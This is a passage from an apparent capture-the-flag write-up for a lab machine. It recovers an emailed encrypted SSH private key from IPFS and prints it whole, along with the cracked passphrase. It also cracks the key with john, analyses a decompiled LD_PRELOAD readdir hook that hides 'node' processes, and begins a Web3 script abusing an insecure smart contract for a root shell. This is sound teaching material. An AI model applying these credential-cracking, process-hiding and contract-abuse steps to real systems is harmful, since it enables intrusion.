+QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V 1688 about
+QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y 200  contact
+QmY5heUM5qgRubMDD1og9fhCPA6QdkMp3QCwd4s7gJsyE7 322  help
+QmejvEPop4D7YUadeGqYWmZxHhLc4JBUCzJJHWMzdcMe2y 12   ping
+QmXgqKTbzdh83pQtKFb19SpMCpDDcKR2ujqk3pKph9aCNF 1692 quick-start
+QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB 1102 readme
+QmQ5vhrL7uv6tuoN9KeVBwd4PwfQkXdVVmDLUZuTNxqgvm 1173 security-notes
+QmWMuEvh2tGJ1DiNPPoN6rXme2jMYUixjxsC6QUji8mop8 2996 maintain/
+QmXymZCHdTHz5BA5ugv9MQTBtQAb6Vit4iFeEnuRj6Udrh 660  gen.py
+QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx 2237 pub/
+QmYn3NxLLYA6xU2XL1QJfCZec4B7MpFNxVVtDvqbiZCFG8 231 chainsaw-emp.csv</span></code></pre></figure>
+
+<p>We see a bunch of files and directories, some which are already familiar from administrator’s home directory. However, there is an extra directory, <em>mail-log</em>, which seems to have a couple of EML (email message) files. They must be emails previously sent to the employees which are stored in blockchain at the moment. Since our target user is <em>bobby</em>, we will try to print the content of <em>bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml</em> hash:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>ipfs <span class="nb">cat </span>QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</code></pre></figure>
+
+<p>The resulting content will display information about both email message header and email content which was sent from <em>chainsaw_admin@protonmail.ch</em> to <em>bobbyaxelrod600@protonmail.ch</em>. The body part consists of a body message and an attachment included in the email – both encoded in Base64 by the email program (ProtonMail).</p>
+
+<p>An alternative way would be to recursively grep for keywords such as “protonmail” to find the relevant chunk of data from <em>/home/bobby/.ipfs/blocks/BLOCKID/CHUNKID.data</em>.</p>
+
+<p>Body message (decoded):</p>
+
+<figure class="highlight"><pre><code class="language-matlab" data-lang="matlab"><span class="n">Bobby</span><span class="p">,</span>
+<span class="n">I</span> <span class="n">am</span> <span class="n">writing</span> <span class="n">this</span> <span class="n">email</span> <span class="n">in</span> <span class="n">reference</span> <span class="n">to</span> <span class="n">the</span> <span class="n">method</span> <span class="n">on</span> <span class="n">how</span> <span class="n">we</span> <span class="n">access</span> <span class="n">our</span> <span class="n">Linux</span> <span class="n">server</span> <span class="n">from</span> <span class="nb">now</span> <span class="n">on</span><span class="o">.</span> <span class="n">Due</span> <span class="n">to</span> <span class="n">security</span> <span class="n">reasons</span><span class="p">,</span> <span class="n">we</span> <span class="n">have</span> <span class="n">disabled</span> <span class="n">SSH</span> <span class="n">password</span> <span class="n">authentication</span> <span class="nb">and</span> <span class="n">instead</span> <span class="n">we</span> <span class="n">will</span> <span class="n">use</span> <span class="n">private</span><span class="p">/</span><span class="n">public</span> <span class="n">key</span> <span class="n">pairs</span> <span class="n">to</span> <span class="n">securely</span> <span class="nb">and</span> <span class="n">conveniently</span> <span class="n">access</span> <span class="n">the</span> <span class="n">machine</span><span class="o">.</span>
+<span class="n">Attached</span> <span class="n">you</span> <span class="n">will</span> <span class="nb">find</span> <span class="n">your</span> <span class="n">personal</span> <span class="n">encrypted</span> <span class="n">private</span> <span class="n">key</span><span class="o">.</span> <span class="n">Please</span> <span class="n">ask</span> <span class="n">the</span> <span class="n">reception</span> <span class="n">desk</span> <span class="k">for</span> <span class="n">your</span> <span class="n">password</span><span class="p">,</span> <span class="n">therefore</span> <span class="n">be</span> <span class="n">sure</span> <span class="n">to</span> <span class="n">bring</span> <span class="n">your</span> <span class="n">valid</span> <span class="n">ID</span> <span class="n">as</span> <span class="n">always</span><span class="o">.</span>
+<span class="n">Sincerely</span><span class="p">,</span>
+<span class="n">IT</span> <span class="n">Administration</span> <span class="n">Department</span></code></pre></figure>
+
+<p>Attachment “bobby.key.enc” (decoded):</p>
+
+<figure class="highlight"><pre><code class="language-matlab" data-lang="matlab"><span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
+<span class="n">Proc</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="n">ENCRYPTED</span>
+<span class="n">DEK</span><span class="o">-</span><span class="n">Info</span><span class="p">:</span> <span class="n">DES</span><span class="o">-</span><span class="n">EDE3</span><span class="o">-</span><span class="n">CBC</span><span class="p">,</span><span class="mi">53</span><span class="n">D881F299BA8503</span>
+<span class="n">SeCNYw</span><span class="p">/</span><span class="n">BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z</span><span class="p">/</span><span class="n">zj</span><span class="o">+</span><span class="n">v1dCIdejuk</span>
+<span class="mi">7</span><span class="n">ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN</span><span class="p">/</span><span class="n">eSxD4AWLcz</span>
+<span class="n">n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2</span><span class="p">/</span><span class="n">eyxE63VcRzrxJCYl</span><span class="o">+</span><span class="n">hvSZ6</span>
+<span class="n">fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m</span><span class="p">/</span><span class="n">pqf3TmGAk9</span><span class="o">+</span><span class="n">wriqnkODFQ</span>
+<span class="n">I</span><span class="o">+</span><span class="mi">2</span><span class="n">I1cPb8JRhLSz3pyB3X</span><span class="p">/</span><span class="n">uGOTnYp4aEq</span><span class="o">+</span><span class="n">AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi</span>
+<span class="n">w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT</span>
+<span class="n">inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2</span>
+<span class="n">yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU</span><span class="o">+</span><span class="n">i1oij4crx1LbO2Lt8nHK6</span>
+<span class="n">G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj</span>
+<span class="n">hQLNp5</span><span class="o">+</span><span class="mi">2</span><span class="n">H4</span><span class="o">+</span><span class="n">i6mmU3t2ogToP4skVcoqDlCC</span><span class="o">+</span><span class="n">j6hDOl4bpD9t6TIJurWxmpGgNxes</span>
+<span class="n">q8NsAentbsD</span><span class="o">+</span><span class="n">xl4W6q5muLJQmj</span><span class="p">/</span><span class="n">xQrrHacEZDGI8kWvZE1iFmVkD</span><span class="p">/</span><span class="n">xBRnwoGZ5ht</span>
+<span class="n">DyilLPpl9R</span><span class="o">+</span><span class="n">Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG</span>
+<span class="n">jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn</span><span class="o">+</span><span class="mi">6</span><span class="n">DU</span><span class="o">+</span><span class="mi">2</span><span class="n">Actejbur0aM74IyeenrGKSSZ</span>
+<span class="n">IZMsd2kTSGUxy9o</span><span class="p">/</span><span class="n">xPKDkUw</span><span class="p">/</span><span class="n">SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw</span>
+<span class="n">TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1</span><span class="p">/</span><span class="n">XDSF2D7ibf</span><span class="p">/</span><span class="n">W1mAxL5UmEqO0</span>
+<span class="n">hUIuW1dRFwHjNvaoSk</span><span class="o">+</span><span class="n">frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi</span>
+<span class="mi">4</span><span class="n">WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z</span><span class="o">+</span><span class="n">fmpbgfWgelLHc2et</span>
+<span class="n">SJY4</span><span class="o">+</span><span class="mi">5</span><span class="n">CEbkAcYEUnPWY9SPOJ7qeU7</span><span class="o">+</span><span class="n">b</span><span class="p">/</span><span class="n">eqzhKbkpnblmiK1f3reOM2YUKy8aaleh</span>
+<span class="n">nJYmkmr3t3qGRzhAETckc8HLE11dGE</span><span class="o">+</span><span class="n">l4ba6WBNu15GoEWAszztMuIV1emnt97oM</span>
+<span class="n">ImnfontOYdwB6</span><span class="p">/</span><span class="mi">2</span><span class="n">oCuyJTif8Vw</span><span class="p">/</span><span class="n">WtWqZNbpey9704a9map</span><span class="p">/</span><span class="o">+</span><span class="n">bDqeQQ41</span><span class="o">+</span><span class="n">B8ACDbK</span>
+<span class="n">WovsgyWi</span><span class="p">/</span><span class="n">UpiMT6m6rX</span><span class="o">+</span><span class="n">FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR</span>
+<span class="n">gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz</span><span class="o">+</span><span class="n">gHpuKlrqhC9ANzr</span><span class="p">/</span><span class="n">Jn</span><span class="o">+</span><span class="mi">5</span><span class="n">ZfG02moF</span><span class="p">/</span>
+<span class="n">edL1bp9HPRI47DyvLwzT1</span><span class="p">/</span><span class="il">5L</span><span class="mi">9</span><span class="n">Zz6Y</span><span class="o">+</span><span class="mi">1</span><span class="n">MzendTi3KrzQ</span><span class="p">/</span><span class="n">Ycfr5YARvYyMLbLjMEtP</span>
+<span class="n">UvJiY40u2nmVb6Qqpiy2zr</span><span class="p">/</span><span class="n">aMlhpupZPk</span><span class="p">/</span><span class="n">xt8oKhKC</span><span class="o">+</span><span class="n">l9mgOTsAXYjCbTmLXzVrX</span>
+<span class="mi">15</span><span class="n">U210BdxEFUDcixNiwTpoBS6MfxCOZwN</span><span class="p">/</span><span class="mi">1</span><span class="n">Zv0mE8ECI</span><span class="o">+</span><span class="il">44L</span><span class="n">cqVt3w</span><span class="o">==</span>
+<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span></code></pre></figure>
+
+<p>Now that we managed to grab the private RSA key for user <em>bobby</em>, we need to decrypt it since it is protected with a passphrase (using triple DES as the encryption algorithm with CBC mode). We will use <code class="highlighter-rouge">ssh2john</code> to extract the hash, and <code class="highlighter-rouge">john</code> to brute force the value (which will eventually give us the password <em>“jackychain”</em>):</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>ssh2john bobby.key.enc <span class="o">&gt;</span> bobby-hash.txt
+<span class="gp">$</span><span class="w"> </span>john bobby-hash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<span class="c">...
+</span><span class="go">jackychain       (bobby.key.enc)
+1g 0:00:05:53 DONE (2018-12-13 23:04) 0.002828g/s 20435p/s 20435c/s 20435C/s jackychain
+</span><span class="c">...
+</span><span class="gp">$</span><span class="w"> </span>openssl rsa <span class="nt">-in</span> bobby.key.enc <span class="nt">-out</span> bobby.key <span class="nt">-passin</span> pass:jackychain
+<span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> bobby.key bobby@10.10.10.142</code></pre></figure>
+
+<p>After logging in, we get the user flag (<em>af8d9d…</em>).</p>
+
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+
+<p>After we SSH in as <em>bobby</em>, we notice the following folders in his home directory:</p>
+
+<p>• <em>projects</em> – contains a folder named <em>ChainsawClub</em> which bobby is working in;<br />
+  • <em>resources</em> – contains some PDFs for the IPFS protocol (not important).</p>
+
+<p>There is yet another smart contract in the <em>ChainsawClub</em> project, this time it is longer in code and seems to make credit transactions. Besides the smart contract <em>(ChainsawClub.sol)</em>, there is its configuration file <em>(ChainsawClub.json)</em> and a binary file with sticky bit set. Running it will generate a new Ethereum address in the current working directory and will ask for credentials (banner will show we need to create a user first), so that is why we start analyzing the code of the contract to get a better understanding.</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="o">.</span><span class="mi">22</span><span class="o">;</span>
+
+<span class="n">contract</span> <span class="nc">ChainsawClub</span> <span class="o">{</span>
+        <span class="n">string</span> <span class="n">username</span> <span class="o">=</span> <span class="err">'</span><span class="n">nobody</span><span class="err">'</span><span class="o">;</span>
+        <span class="n">string</span> <span class="n">password</span> <span class="o">=</span> <span class="err">'</span><span class="mi">7</span><span class="n">b455ca1ffcb9f3828cfdde4a396139e</span><span class="err">'</span><span class="o">;</span>
+        <span class="n">bool</span> <span class="n">approve</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="n">uint</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="mi">1000</span><span class="o">;</span>
+        <span class="n">uint</span> <span class="n">userBalance</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+
+        <span class="n">function</span> <span class="nf">getUsername</span><span class="o">()</span> <span class="kd">public</span> <span class="n">view</span> <span class="nf">returns</span> <span class="o">(</span><span class="n">string</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">username</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">setUsername</span><span class="o">(</span><span class="n">string</span> <span class="n">_value</span><span class="o">)</span> <span class="kd">public</span> <span class="o">{</span>
+            <span class="n">username</span> <span class="o">=</span> <span class="n">_value</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">getPassword</span><span class="o">()</span> <span class="kd">public</span> <span class="n">view</span> <span class="nf">returns</span> <span class="o">(</span><span class="n">string</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">password</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">setPassword</span><span class="o">(</span><span class="n">string</span> <span class="n">_value</span><span class="o">)</span> <span class="kd">public</span> <span class="o">{</span>
+            <span class="n">password</span> <span class="o">=</span> <span class="n">_value</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">getApprove</span><span class="o">()</span> <span class="kd">public</span> <span class="n">view</span> <span class="nf">returns</span> <span class="o">(</span><span class="n">bool</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">approve</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">setApprove</span><span class="o">(</span><span class="n">bool</span> <span class="n">_value</span><span class="o">)</span> <span class="kd">public</span> <span class="o">{</span>
+            <span class="n">approve</span> <span class="o">=</span> <span class="n">_value</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">getSupply</span><span class="o">()</span> <span class="kd">public</span> <span class="n">view</span> <span class="nf">returns</span> <span class="o">(</span><span class="n">uint</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">totalSupply</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">getBalance</span><span class="o">()</span> <span class="kd">public</span> <span class="n">view</span> <span class="nf">returns</span> <span class="o">(</span><span class="n">uint</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">userBalance</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">transfer</span><span class="o">(</span><span class="n">uint</span> <span class="n">_value</span><span class="o">)</span> <span class="kd">public</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">_value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">_value</span> <span class="o">&lt;=</span> <span class="n">totalSupply</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">totalSupply</span> <span class="o">-=</span> <span class="n">_value</span><span class="o">;</span>
+                <span class="n">userBalance</span> <span class="o">+=</span> <span class="n">_value</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="n">function</span> <span class="nf">reset</span><span class="o">()</span> <span class="kd">public</span> <span class="o">{</span>
+            <span class="n">username</span> <span class="o">=</span> <span class="err">''</span><span class="o">;</span>
+            <span class="n">password</span> <span class="o">=</span> <span class="err">''</span><span class="o">;</span>
+            <span class="n">userBalance</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+            <span class="n">totalSupply</span> <span class="o">=</span> <span class="mi">1000</span><span class="o">;</span>
+            <span class="n">approve</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>We notice a bunch of getters and setters by breaking down the code:</p>
+
+<ol>
+  <li><span style="color:#a6e22e;">setUsername()</span> and <span style="color:#a6e22e;">setPassword()</span> which allows us to basically create a ‘new’ account;</li>
+  <li><span style="color:#a6e22e;">setApprove()</span> to possibly approve the user. Default is false so we may need to overwrite;</li>
+  <li><span style="color:#a6e22e;">getSupply()</span> to get total supply from the application and <span style="color:#a6e22e;">getBalance()</span> to get user balance;</li>
+  <li><span style="color:#a6e22e;">transfer()</span> which actually performs a simple, logical transaction;</li>
+  <li><span style="color:#a6e22e;">reset()</span> which resets all variable to default values.</li>
+</ol>
+
+<p>For the exploit development part, we need to use the <code class="highlighter-rouge">Web3</code> library again to interact with the Ethereum interface, however, this time we do not have any information with reference to another RPC interface within the box. If we check the <code class="highlighter-rouge">ChainsawClub</code> binary shared object dependencies using <code class="highlighter-rouge">ldd</code>, we can notice an unusual preloaded library named <em>chainsaw.so</em> before default system objects are invoked:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>ldd ChainsawClub
+<span class="go">        linux-vdso.so.1 (0x00007fff708b0000)
+</span><span class="gp">        /usr/$</span>LIB/chainsaw.so <span class="o">=&gt;</span> /usr/lib/x86_64-linux-gnu/chainsaw.so <span class="o">(</span>0x00007f351569b000<span class="o">)</span>
+<span class="gp">        libc.so.6 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f35154a8000<span class="o">)</span>
+<span class="gp">        libdl.so.2 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libdl.so.2 <span class="o">(</span>0x00007f35154a2000<span class="o">)</span>
+<span class="go">        /lib64/ld-linux-x86-64.so.2 (0x00007f35156a8000)</span></code></pre></figure>
+
+<p>Since we are using 64-bit ELF files, the <em>$LIB</em> variable will expand to <em>lib/x86_64-linux-gnu/</em> in our Debian case. If we disassemble the <em>chainsaw.so</em> binary, we will first notice hardcoded declared variables:</p>
+
+<p><img src="/assets/images/chainsaw3.png" /></p>
+
+<p>What stands out is that “<em>process_to_filter</em>” has a value of the string “<em>node</em>” which is later referenced in the following procedure:</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">int</span> <span class="nf">readdir64</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">var_228</span> <span class="o">=</span> <span class="n">arg0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">original_readdir64</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="o">*</span><span class="n">original_readdir64</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">,</span> <span class="s">"readdir"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">original_readdir64</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">fprintf</span><span class="p">(</span><span class="o">**</span><span class="n">qword_3ff8</span><span class="p">,</span> <span class="s">"Error in dlsym: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dlerror</span><span class="p">());</span>
+            <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">do</span> <span class="p">{</span>
+            <span class="n">var_218</span> <span class="o">=</span> <span class="n">original_readdir64</span><span class="p">(</span><span class="n">var_228</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">var_218</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">rax</span> <span class="o">=</span> <span class="n">get_dir_name</span><span class="p">(</span><span class="n">var_228</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_210</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">rax</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">rax</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_210</span><span class="p">,</span> <span class="s">"/proc"</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">rax</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">rax</span> <span class="o">=</span> <span class="n">get_process_name</span><span class="p">(</span><span class="n">var_218</span> <span class="o">+</span> <span class="mh">0x13</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_110</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">rax</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">rax</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_110</span><span class="p">,</span> <span class="o">*</span><span class="n">process_to_filter</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">rax</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">);</span>
+    <span class="n">rax</span> <span class="o">=</span> <span class="n">var_218</span><span class="p">;</span>
+    <span class="n">rcx</span> <span class="o">=</span> <span class="o">*</span><span class="mh">0x28</span> <span class="o">^</span> <span class="o">*</span><span class="mh">0x28</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">rcx</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">rax</span> <span class="o">=</span> <span class="n">__stack_chk_fail</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">rax</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The logic is fairly simple – the structure makes use of two functions by iterating the <span style="color:#a6e22e;">get_dir_name()</span> function which returns a relevant directory name given the <em>DIR*</em> handle, and <span style="color:#a6e22e;">get_process_name()</span> that finds the correct process name given a <em>PID</em> number used in <em>/proc/PID</em>. The process is basically overriding libc’s <span style="color:#a6e22e;">readdir()</span> function so that everytime the <em>/proc/PID</em> directory is read from a binary (which by default loads this shared library before the normal system’s ones), the access to that specific PID belonging to <em>process_to_filter</em> is skipped/blocked.</p>
+
+<p>Simply put, any process initiated with “<em>node</em>” is not shown in our typical process listing tools such as <code class="highlighter-rouge">ps</code>. Consequently, we do not know the port number the RPC uses since <code class="highlighter-rouge">ganache-cli</code> uses <code class="highlighter-rouge">node</code>. However, if we check ports listening internally within the machine using <code class="highlighter-rouge">netstat</code>, we will see a queer port number of 63991. We can only assume that it belongs to Ethereum RPC for now.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>netstat <span class="nt">-punta</span> | <span class="nb">grep </span>LISTEN
+<span class="go">(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -   </span></code></pre></figure>
+
+<p>Moving on, we will develop another script to try and interact with the higher port number – and indeed, confirm that it is an RPC interface. To summarize the exploit script, which needs quite some attempts to get it right through playing around contract’s functions, we need to fulfill four conditions:</p>
+
+<ol>
+  <li>Set a new username and password. Default values equal to blank, which the program returns a <em>“Blank credentials not allowed”</em></li>
+  <li>Match the credentials from the smart contract, otherwise you get a <em>“Wrong credentials”</em> message</li>
+  <li>Approve our user since the program was returning a <em>“User is not approved”</em> message</li>
+  <li>Transfer enough (all) funds from supply to our user’s balance in order to enter the club (root shell), otherwise you get a <em>“Not enough funds”</em> message</li>
+</ol>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+</span><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+<span class="kn">import</span> <span class="nn">json</span><span class="p">,</span> <span class="n">hashlib</span>
+
+<span class="k">def</span> <span class="nf">enter_club</span><span class="p">():</span>
+    <span class="c1"># Store Ethereum contract address
+</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/home/bobby/projects/ChainsawClub/address.txt"</span><span class="p">,</span><span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">caddress</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="c1"># Load Ethereum contract configuration
+</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/home/bobby/projects/ChainsawClub/ChainsawClub.json'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">contractData</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="c1"># Establish a connection with the Ethereum RPC interface
+</span>    <span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="s">'http://127.0.0.1:63991'</span><span class="p">))</span>
+    <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">defaultAccount</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="c1"># Get Application Binary Interface (ABI) and Ethereum bytecode
+</span>    <span class="n">Url</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">abi</span><span class="o">=</span><span class="n">contractData</span><span class="p">[</span><span class="s">'abi'</span><span class="p">],</span>
+                          <span class="n">bytecode</span><span class="o">=</span><span class="n">contractData</span><span class="p">[</span><span class="s">'bytecode'</span><span class="p">])</span>
+    <span class="n">contractInstance</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">caddress</span><span class="p">,</span>
+                                       <span class="n">abi</span><span class="o">=</span><span class="n">contractData</span><span class="p">[</span><span class="s">'abi'</span><span class="p">])</span>
+
+    <span class="c1"># Phase I &amp; II: Create a new account and confirm
+</span>    <span class="n">username</span> <span class="o">=</span> <span class="s">"artikrh"</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+    <span class="n">password</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="s">"arti"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">setUsername</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+    <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">setPassword</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+    <span class="n">cusername</span> <span class="o">=</span> <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">getUsername</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
